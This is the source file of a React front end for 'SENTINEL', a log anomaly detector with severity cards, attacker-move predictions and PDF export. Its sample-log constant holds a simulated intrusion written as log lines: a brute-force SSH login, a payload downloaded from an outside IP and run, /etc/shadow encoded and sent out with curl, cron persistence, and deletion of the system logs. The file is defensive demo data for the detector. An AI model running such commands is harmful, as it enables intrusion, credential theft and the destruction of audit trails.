import { useState, useRef, useCallback } from "react";
import jsPDF from "jspdf";
import type { AnalysisResult, Severity, PredictionResult, PredictionStep } from "./types";
import "./App.css";

// ── Types ──────────────────────────────────────────────────────────────────

interface LogFile {
  id: string;
  name: string;
  content: string;
}

const COMBINED_ID = "__combined__";

const SAMPLE_LOGS = `Jan 15 04:31:02 webserver sshd[1234]: Failed password for root from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:05 webserver sshd[1234]: Failed password for root from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:08 webserver sshd[1234]: Failed password for root from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:11 webserver sshd[1234]: Failed password for root from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:14 webserver sshd[1234]: Failed password for root from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:17 webserver sshd[1234]: Failed password for admin from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:20 webserver sshd[1234]: Failed password for admin from 45.33.32.156 port 52914 ssh2
Jan 15 04:31:23 webserver sshd[1234]: Failed password for admin from 45.33.32.156 port 52914 ssh2
Jan 15 04:32:01 webserver sshd[1234]: Accepted password for sysadmin from 45.33.32.156 port 52914 ssh2
Jan 15 04:32:03 webserver sshd[1235]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)
Jan 15 04:32:15 webserver sudo[2201]: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/su
Jan 15 04:32:16 webserver su[2202]: Successful su for root by sysadmin
Jan 15 04:32:30 webserver bash[2203]: root: wget http://185.220.101.45/payload.sh -O /tmp/.hidden_payload.sh
Jan 15 04:32:31 webserver bash[2203]: root: chmod +x /tmp/.hidden_payload.sh
Jan 15 04:32:32 webserver bash[2203]: root: /tmp/.hidden_payload.sh
Jan 15 04:33:10 webserver sshd[2301]: Accepted publickey for root from 192.168.1.50 port 44231 ssh2
Jan 15 04:33:15 webserver bash[2401]: root: ssh -i /tmp/.ssh_key 192.168.1.55 -C "cat /etc/passwd"
Jan 15 04:33:18 webserver bash[2401]: root: ssh -i /tmp/.ssh_key 192.168.1.60 -C "id"
Jan 15 04:33:45 webserver bash[2402]: root: cat /etc/shadow
Jan 15 04:33:46 webserver bash[2402]: root: cat /etc/shadow | base64 > /tmp/out.b64
Jan 15 04:34:02 webserver bash[2403]: root: curl -X POST http://185.220.101.45:4444 -d @/tmp/out.b64
Jan 15 04:34:15 webserver cron[2501]: (root) CMD (/tmp/.hidden_payload.sh)
Jan 15 04:34:16 webserver bash[2502]: root: echo "*/5 * * * * root /tmp/.hidden_payload.sh" >> /etc/crontab
Jan 15 04:35:00 webserver bash[2503]: root: rm -f /var/log/auth.log
Jan 15 04:35:01 webserver bash[2503]: root: rm -f /var/log/syslog`;

// ── Constants ──────────────────────────────────────────────────────────────

const SEVERITY_CONFIG: Record<Severity, { color: string; bg: string; label: string }> = {
  critical: { color: "#ff4d4d", bg: "#2d0000", label: "CRITICAL" },
  high:     { color: "#ff8c00", bg: "#2d1a00", label: "HIGH" },
  medium:   { color: "#ffd700", bg: "#2d2600", label: "MEDIUM" },
  low:      { color: "#00bfff", bg: "#002d3a", label: "LOW" },
};
const SEVERITY_ORDER: Severity[] = ["critical", "high", "medium", "low"];

// ── PDF Export ─────────────────────────────────────────────────────────────

function exportPDF(result: AnalysisResult, filename: string) {
  const doc = new jsPDF({ unit: "mm", format: "a4" });
  const W = 210;
  const margin = 16;
  const contentWidth = W - margin * 2;
  let y = 0;

  const pageBreakIfNeeded = (needed: number) => {
    if (y + needed > 275) {
      doc.addPage();
      y = 20;
    }
  };

  // Header bar
  doc.setFillColor(10, 10, 18);
  doc.rect(0, 0, W, 28, "F");
  doc.setTextColor(0, 212, 255);
  doc.setFontSize(18);
  doc.setFont("helvetica", "bold");
  doc.text("SENTINEL", margin, 13);
  doc.setFontSize(9);
  doc.setFont("helvetica", "normal");
  doc.setTextColor(100, 120, 140);
  doc.text("Security Incident Report", margin, 20);
  doc.setTextColor(80, 100, 120);
  doc.text(`Generated: ${new Date().toLocaleString()}`, W - margin, 20, { align: "right" });
  doc.text(`Source: ${filename}`, W - margin, 13, { align: "right" });

  y = 38;

  // Risk score + summary
  const riskColor: [number, number, number] =
    result.risk_score >= 80 ? [255, 77, 77] :
    result.risk_score >= 50 ? [255, 140, 0] :
    result.risk_score >= 25 ? [255, 215, 0] : [0, 255, 136];

  doc.setFillColor(15, 15, 30);
  doc.roundedRect(margin, y, contentWidth, 28, 3, 3, "F");
  doc.setFontSize(28);
  doc.setFont("helvetica", "bold");
  doc.setTextColor(...riskColor);
  doc.text(String(result.risk_score), margin + 10, y + 18);
  doc.setFontSize(8);
  doc.setTextColor(80, 100, 120);
  doc.text("RISK SCORE", margin + 10, y + 24);

  doc.setFontSize(9);
  doc.setFont("helvetica", "normal");
  doc.setTextColor(160, 170, 187);
  const summaryLines = doc.splitTextToSize(result.summary, contentWidth - 36);
  doc.text(summaryLines, margin + 30, y + 10);

  y += 36;

  // Severity counts
  const counts = SEVERITY_ORDER.map(s => ({
    s, count: result.anomalies.filter(a => a.severity === s).length,
    cfg: SEVERITY_CONFIG[s],
  }));
  const boxW = (contentWidth - 9) / 4;
  counts.forEach(({ s: _s, count, cfg }, i) => {
    const x = margin + i * (boxW + 3);
    doc.setFillColor(10, 10, 21);
    doc.roundedRect(x, y, boxW, 14, 2, 2, "F");
    const [r, g, b] = hexToRgb(cfg.color);
    doc.setTextColor(r, g, b);
    doc.setFontSize(14);
    doc.setFont("helvetica", "bold");
    doc.text(String(count), x + boxW / 2, y + 9, { align: "center" });
    doc.setFontSize(6);
    doc.setFont("helvetica", "normal");
    doc.setTextColor(80, 100, 120);
    doc.text(cfg.label, x + boxW / 2, y + 13, { align: "center" });
  });

  y += 22;

  // Findings
  if (result.anomalies.length === 0) {
    doc.setFontSize(11);
    doc.setTextColor(0, 200, 100);
    doc.text("No anomalies detected. Logs appear normal.", margin, y);
  } else {
    const sorted = [...result.anomalies].sort(
      (a, b) => SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity)
    );

    doc.setFontSize(10);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(80, 100, 120);
    doc.text(`DETECTED THREATS (${sorted.length})`, margin, y);
    y += 6;

    sorted.forEach((anomaly) => {
      const cfg = SEVERITY_CONFIG[anomaly.severity];
      const [r, g, b] = hexToRgb(cfg.color);
      const descLines = doc.splitTextToSize(anomaly.description, contentWidth - 6);
      const evidenceLines = anomaly.evidence.flatMap(e => doc.splitTextToSize(e, contentWidth - 10));
      const cardH = 8 + descLines.length * 4.5 + evidenceLines.length * 4 + 14;

      pageBreakIfNeeded(cardH);

      doc.setFillColor(15, 15, 30);
      doc.roundedRect(margin, y, contentWidth, cardH, 2, 2, "F");
      doc.setFillColor(r, g, b);
      doc.rect(margin, y, 3, cardH, "F");

      // Title row
      doc.setFontSize(7);
      doc.setFont("helvetica", "bold");
      doc.setTextColor(r, g, b);
      doc.text(cfg.label, margin + 6, y + 5.5);
      doc.setTextColor(210, 220, 240);
      doc.setFontSize(9);
      doc.text(anomaly.title, margin + 22, y + 5.5);
      doc.setFontSize(7);
      doc.setFont("helvetica", "normal");
      doc.setTextColor(80, 100, 120);
      doc.text(anomaly.tactic, W - margin - 2, y + 5.5, { align: "right" });

      // Meta
      let metaY = y + 10;
      const metaParts: string[] = [];
      if (anomaly.affected_user) metaParts.push(`User: ${anomaly.affected_user}`);
      if (anomaly.source_ip) metaParts.push(`IP: ${anomaly.source_ip}`);
      if (anomaly.time_window) metaParts.push(`Time: ${anomaly.time_window}`);
      if (metaParts.length) {
        doc.setFontSize(7);
        doc.setTextColor(70, 90, 110);
        doc.text(metaParts.join("   "), margin + 6, metaY);
        metaY += 5;
      }

      // Description
      doc.setFontSize(8);
      doc.setFont("helvetica", "normal");
      doc.setTextColor(140, 155, 170);
      doc.text(descLines, margin + 6, metaY);
      metaY += descLines.length * 4.5 + 2;

      // Evidence
      doc.setFontSize(6.5);
      doc.setTextColor(60, 80, 100);
      doc.text("EVIDENCE", margin + 6, metaY);
      metaY += 4;
      doc.setTextColor(100, 130, 150);
      doc.setFont("courier", "normal");
      doc.text(evidenceLines, margin + 8, metaY);

      y += cardH + 4;
    });
  }

  doc.save(`sentinel-report-${filename.replace(/[^a-z0-9]/gi, "-")}.pdf`);
}

function hexToRgb(hex: string): [number, number, number] {
  const r = parseInt(hex.slice(1, 3), 16);
  const g = parseInt(hex.slice(3, 5), 16);
  const b = parseInt(hex.slice(5, 7), 16);
  return [r, g, b];
}

// ── Sub-components ─────────────────────────────────────────────────────────

function RiskGauge({ score }: { score: number }) {
  const color = score >= 80 ? "#ff4d4d" : score >= 50 ? "#ff8c00" : score >= 25 ? "#ffd700" : "#00ff88";
  const circumference = 2 * Math.PI * 54;
  const dash = (score / 100) * circumference;
  return (
    <div className="risk-gauge">
      <svg width="140" height="140" viewBox="0 0 140 140">
        <circle cx="70" cy="70" r="54" fill="none" stroke="#1a1a2e" strokeWidth="12" />
        <circle cx="70" cy="70" r="54" fill="none" stroke={color} strokeWidth="12"
          strokeDasharray={`${dash} ${circumference}`} strokeLinecap="round"
          transform="rotate(-90 70 70)"
          style={{ transition: "stroke-dasharray 1s ease, stroke 0.5s ease" }} />
        <text x="70" y="65" textAnchor="middle" fill={color} fontSize="28" fontWeight="bold" fontFamily="monospace">{score}</text>
        <text x="70" y="85" textAnchor="middle" fill="#888" fontSize="11" fontFamily="monospace">RISK SCORE</text>
      </svg>
    </div>
  );
}

function AnomalyCard({ anomaly }: { anomaly: import("./types").Anomaly }) {
  const [expanded, setExpanded] = useState(false);
  const cfg = SEVERITY_CONFIG[anomaly.severity];
  return (
    <div className="anomaly-card" style={{ borderLeft: `4px solid ${cfg.color}`, background: cfg.bg }}>
      <div className="card-header" onClick={() => setExpanded(!expanded)}>
        <div className="card-title-row">
          <span className="severity-badge" style={{ color: cfg.color, border: `1px solid ${cfg.color}` }}>{cfg.label}</span>
          <span className="card-title">{anomaly.title}</span>
          <span className="tactic-badge">{anomaly.tactic}</span>
        </div>
        <div className="card-meta">
          {anomaly.affected_user && <span>👤 {anomaly.affected_user}</span>}
          {anomaly.source_ip && <span>🌐 {anomaly.source_ip}</span>}
          {anomaly.time_window && <span>🕐 {anomaly.time_window}</span>}
          <span className="expand-icon">{expanded ? "▲" : "▼"}</span>
        </div>
      </div>
      {expanded && (
        <div className="card-body">
          <p className="card-description">{anomaly.description}</p>
          <div className="evidence-section">
            <span className="evidence-label">Evidence</span>
            {anomaly.evidence.map((line, i) => <code key={i} className="evidence-line">{line}</code>)}
          </div>
        </div>
      )}
    </div>
  );
}

// ── Attacker Prediction ────────────────────────────────────────────────────

function LikelihoodBar({ value }: { value: number }) {
  const color = value >= 75 ? "#ff4d4d" : value >= 50 ? "#ff8c00" : "#ffd700";
  return (
    <div className="likelihood-bar-track">
      <div className="likelihood-bar-fill" style={{ width: `${value}%`, background: color }} />
      <span className="likelihood-pct" style={{ color }}>{value}%</span>
    </div>
  );
}

function PredictionCard({ pred, index }: { pred: PredictionStep; index: number }) {
  const [expanded, setExpanded] = useState(false);
  const color = pred.likelihood >= 75 ? "#ff4d4d" : pred.likelihood >= 50 ? "#ff8c00" : "#ffd700";
  return (
    <div className="prediction-card" style={{ borderLeft: `3px solid ${color}` }}>
      <div className="prediction-card-header" onClick={() => setExpanded(!expanded)}>
        <div className="pred-step-num" style={{ color, borderColor: color }}>{index + 1}</div>
        <div className="pred-header-body">
          <div className="pred-title-row">
            <span className="pred-technique">{pred.technique}</span>
            <span className="pred-id">{pred.technique_id}</span>
            <span className="pred-tactic">{pred.tactic}</span>
          </div>
          <LikelihoodBar value={pred.likelihood} />
        </div>
        <span className="expand-icon">{expanded ? "▲" : "▼"}</span>
      </div>
      {expanded && (
        <div className="prediction-card-body">
          <p className="pred-description">{pred.description}</p>
          <div className="pred-section">
            <span className="pred-section-label">WATCH FOR</span>
            {pred.indicators.map((ind, i) => (
              <code key={i} className="pred-indicator">{ind}</code>
            ))}
          </div>
          <div className="pred-section">
            <span className="pred-section-label">COUNTERMEASURE</span>
            <p className="pred-defense">{pred.defense}</p>
          </div>
        </div>
      )}
    </div>
  );
}

function AttackerPrediction({ prediction, loading }: { prediction: PredictionResult | null; loading: boolean }) {
  if (loading) {
    return (
      <div className="prediction-panel">
        <div className="prediction-header">
          <span className="pred-skull">☠</span>
          <span className="pred-panel-title">WHAT HAPPENS NEXT</span>
          <span className="pred-panel-sub">AI Attacker Prediction</span>
        </div>
        <div className="prediction-loading">
          <span className="spinner pred-spinner" />
          <span>Modeling attacker behavior via MITRE ATT&amp;CK...</span>
        </div>
      </div>
    );
  }
  if (!prediction) return null;
  return (
    <div className="prediction-panel">
      <div className="prediction-header">
        <span className="pred-skull">☠</span>
        <span className="pred-panel-title">WHAT HAPPENS NEXT</span>
        <span className="pred-panel-sub">AI Attacker Prediction · Powered by MITRE ATT&amp;CK</span>
      </div>
      <div className="prediction-meta">
        <div className="pred-meta-row">
          <span className="pred-meta-label">CURRENT STAGE</span>
          <span className="pred-current-stage">{prediction.current_stage}</span>
        </div>
        <div className="pred-meta-row">
          <span className="pred-meta-label">ATTACKER OBJECTIVE</span>
          <p className="pred-objective">{prediction.attacker_objective}</p>
        </div>
      </div>
      <div className="prediction-list-header">PREDICTED NEXT MOVES</div>
      <div className="prediction-list">
        {prediction.predictions.map((p, i) => (
          <PredictionCard key={i} pred={p} index={i} />
        ))}
      </div>
    </div>
  );
}

// ── Main App ───────────────────────────────────────────────────────────────

export default function App() {
  const [files, setFiles] = useState<LogFile[]>([]);
  const [activeFileId, setActiveFileId] = useState<string | null>(null);
  const [manualText, setManualText] = useState("");
  const [results, setResults] = useState<Record<string, AnalysisResult>>({});
  const [loadingIds, setLoadingIds] = useState<Set<string>>(new Set());
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [activeResultId, setActiveResultId] = useState<string | null>(null);
  const [dragging, setDragging] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // ── File helpers ──

  const addFiles = useCallback((newFiles: FileList | File[]) => {
    const arr = Array.from(newFiles).filter(f => f.type === "text/plain" || f.name.endsWith(".log") || f.name.endsWith(".txt"));
    if (arr.length === 0) return;
    arr.forEach(file => {
      const reader = new FileReader();
      reader.onload = (e) => {
        const content = e.target?.result as string;
        setFiles(prev => {
          if (prev.some(f => f.name === file.name)) return prev;
          const newFile: LogFile = { id: crypto.randomUUID(), name: file.name, content };
          if (prev.length === 0) setActiveFileId(newFile.id);
          return [...prev, newFile];
        });
      };
      reader.readAsText(file);
    });
  }, []);

  const removeFile = (id: string) => {
    setFiles(prev => {
      const next = prev.filter(f => f.id !== id);
      if (activeFileId === id) setActiveFileId(next[0]?.id ?? null);
      return next;
    });
    setResults(prev => { const r = { ...prev }; delete r[id]; return r; });
    setErrors(prev => { const r = { ...prev }; delete r[id]; return r; });
    if (activeResultId === id) setActiveResultId(null);
  };

  // ── Drag & drop ──

  const onDragOver = (e: React.DragEvent) => { e.preventDefault(); setDragging(true); };
  const onDragLeave = () => setDragging(false);
  const onDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragging(false);
    addFiles(e.dataTransfer.files);
  };

  // ── Analysis ──

  const analyze = async (id: string, content: string, _label: string) => {
    setLoadingIds(prev => new Set(prev).add(id));
    setErrors(prev => { const r = { ...prev }; delete r[id]; return r; });
    try {
      const res = await fetch("https://log-anomaly-detector.onrender.com/analyze", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ log_text: content }),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error((data as { detail?: string }).detail || `Server error ${res.status}`);
      }
      const data: AnalysisResult = await res.json();
      setResults(prev => ({ ...prev, [id]: data }));
      setActiveResultId(id);
    } catch (err) {
      setErrors(prev => ({ ...prev, [id]: err instanceof Error ? err.message : "Unknown error" }));
    } finally {
      setLoadingIds(prev => { const s = new Set(prev); s.delete(id); return s; });
    }
  };

  const analyzeActive = () => {
    if (files.length === 0) {
      analyze("manual", manualText, "Manual Input");
    } else if (activeFileId) {
      const file = files.find(f => f.id === activeFileId)!;
      analyze(file.id, file.content, file.name);
    }
  };

  const analyzeAll = () => {
    const combined = files.map(f => `=== ${f.name} ===\n${f.content}`).join("\n\n");
    analyze(COMBINED_ID, combined, "All Files");
  };

  // ── Active content ──

  const activeFile = files.find(f => f.id === activeFileId);
  const currentText = files.length === 0 ? manualText : (activeFile?.content ?? "");
  const currentId = files.length === 0 ? "manual" : (activeFileId ?? "");
  const isLoadingCurrent = loadingIds.has(currentId);
  const isLoadingAll = loadingIds.has(COMBINED_ID);

  const activeResult = activeResultId ? results[activeResultId] : null;
  const activePrediction = activeResult?.prediction ?? null;
  const isPredLoading = activeResultId ? loadingIds.has(activeResultId) : isLoadingCurrent;
  const activeResultLabel =
    activeResultId === COMBINED_ID ? "All Files" :
    activeResultId === "manual" ? "Manual Input" :
    files.find(f => f.id === activeResultId)?.name ?? "";

  const resultTabs = [
    ...files.filter(f => results[f.id]).map(f => ({ id: f.id, label: f.name })),
    ...(results["manual"] ? [{ id: "manual", label: "Manual Input" }] : []),
    ...(results[COMBINED_ID] ? [{ id: COMBINED_ID, label: "All Files" }] : []),
  ];

  const sortedAnomalies = activeResult
    ? [...activeResult.anomalies].sort((a, b) => SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity))
    : [];

  return (
    <div className="app">
      <header className="header">
        <div className="header-left">
          <span className="logo">⬡</span>
          <span className="header-title">SENTINEL</span>
          <span className="header-sub">Log Anomaly Detector</span>
        </div>
        <div className="header-right">
          <span className="powered-by">Powered by Claude Sonnet 4.6</span>
        </div>
      </header>

      <main className="main">
        {/* ── Drop Zone ── */}
        <div
          className={`drop-zone ${dragging ? "dragging" : ""} ${files.length > 0 ? "has-files" : ""}`}
          onDragOver={onDragOver} onDragLeave={onDragLeave} onDrop={onDrop}
          onClick={() => files.length === 0 && fileInputRef.current?.click()}
        >
          <input ref={fileInputRef} type="file" accept=".log,.txt,text/plain" multiple hidden
            onChange={e => e.target.files && addFiles(e.target.files)} />

          {files.length === 0 ? (
            <div className="drop-prompt">
              <span className="drop-icon">⬆</span>
              <span className="drop-text">Drop <code>.log</code> or <code>.txt</code> files here, or click to browse</span>
            </div>
          ) : (
            <div className="file-list">
              {files.map(f => (
                <div key={f.id}
                  className={`file-chip ${activeFileId === f.id ? "active" : ""} ${loadingIds.has(f.id) ? "loading" : ""} ${results[f.id] ? "done" : ""}`}
                  onClick={e => { e.stopPropagation(); setActiveFileId(f.id); }}>
                  <span className="file-chip-icon">
                    {loadingIds.has(f.id) ? "⟳" : results[f.id] ? "✓" : "📄"}
                  </span>
                  <span className="file-chip-name">{f.name}</span>
                  <span className="file-chip-lines">{f.content.split("\n").filter(Boolean).length}L</span>
                  <button className="file-chip-remove" onClick={e => { e.stopPropagation(); removeFile(f.id); }}>✕</button>
                </div>
              ))}
              <button className="add-more-btn" onClick={e => { e.stopPropagation(); fileInputRef.current?.click(); }}>+ Add</button>
            </div>
          )}
        </div>

        {/* ── Input Panel ── */}
        <div className="input-panel">
          <div className="panel-header">
            <span className="panel-label">
              {activeFile ? activeFile.name.toUpperCase() : "LOG INPUT"}
            </span>
            {files.length === 0 && (
              <button className="sample-btn" onClick={() => setManualText(SAMPLE_LOGS)}>
                Load Sample Attack Chain
              </button>
            )}
          </div>
          <textarea
            className="log-textarea"
            value={currentText}
            onChange={e => { if (files.length === 0) setManualText(e.target.value); }}
            readOnly={files.length > 0}
            placeholder={"Paste raw server/auth logs here, or drop files above...\n\nSupports: syslog, auth.log, /var/log/secure, SSH logs, sudo logs, cron logs"}
            spellCheck={false}
          />
          <div className="input-footer">
            <span className="line-count">
              {currentText ? `${currentText.split("\n").filter(Boolean).length} lines` : "No input"}
            </span>
            <div className="action-btns">
              {files.length > 1 && (
                <button className="analyze-all-btn" onClick={analyzeAll} disabled={isLoadingAll}>
                  {isLoadingAll ? <><span className="spinner" /> Analyzing all...</> : `⬡ Analyze All (${files.length} files)`}
                </button>
              )}
              <button className="analyze-btn" onClick={analyzeActive}
                disabled={isLoadingCurrent || !currentText.trim()}>
                {isLoadingCurrent ? <><span className="spinner" /> Analyzing...</> : "▶  Analyze"}
              </button>
            </div>
          </div>
        </div>

        {/* ── Errors ── */}
        {Object.entries(errors).map(([id, msg]) => (
          <div key={id} className="error-banner">⚠ {files.find(f => f.id === id)?.name ?? id}: {msg}</div>
        ))}

        {/* ── Result Tabs ── */}
        {resultTabs.length > 0 && (
          <div className="result-tabs">
            {resultTabs.map(tab => (
              <button key={tab.id}
                className={`result-tab ${activeResultId === tab.id ? "active" : ""}`}
                onClick={() => setActiveResultId(tab.id)}>
                {tab.label}
                <span className="tab-count">
                  {results[tab.id].anomalies.length > 0
                    ? results[tab.id].anomalies.length
                    : "✓"}
                </span>
              </button>
            ))}
          </div>
        )}

        {/* ── Results ── */}
        {activeResult && (
          <div className="results-panel">
            <div className="results-header">
              <RiskGauge score={activeResult.risk_score} />
              <div className="summary-block">
                <div className="summary-label">ANALYSIS SUMMARY — {activeResultLabel}</div>
                <p className="summary-text">{activeResult.summary}</p>
                <div className="severity-counts">
                  {SEVERITY_ORDER.map(s => {
                    const cfg = SEVERITY_CONFIG[s];
                    const count = activeResult.anomalies.filter(a => a.severity === s).length;
                    return (
                      <div key={s} className="severity-count" style={{ borderColor: cfg.color }}>
                        <span className="count-num" style={{ color: cfg.color }}>{count}</span>
                        <span className="count-label">{cfg.label}</span>
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>

            {/* Export buttons */}
            <div className="export-row">
              <span className="export-label">EXPORT</span>
              <button className="export-btn" onClick={() => {
                const blob = new Blob([JSON.stringify(activeResult, null, 2)], { type: "application/json" });
                const a = document.createElement("a");
                a.href = URL.createObjectURL(blob);
                a.download = `sentinel-report-${activeResultLabel.replace(/[^a-z0-9]/gi, "-")}.json`;
                a.click();
              }}>
                ↓ JSON
              </button>
              <button className="export-btn" onClick={() => exportPDF(activeResult, activeResultLabel)}>
                ↓ PDF
              </button>
            </div>

            {sortedAnomalies.length === 0 ? (
              <div className="no-findings">✓ No anomalies detected. Logs appear normal.</div>
            ) : (
              <div className="anomaly-list">
                <div className="list-header">
                  DETECTED THREATS ({sortedAnomalies.length})
                  <span className="list-hint">Click to expand evidence</span>
                </div>
                {sortedAnomalies.map((anomaly, i) => <AnomalyCard key={i} anomaly={anomaly} />)}
              </div>
            )}

            {(isPredLoading || activePrediction) && (
              <AttackerPrediction prediction={activePrediction} loading={isPredLoading} />
            )}
          </div>
        )}
      </main>
    </div>
  );
}
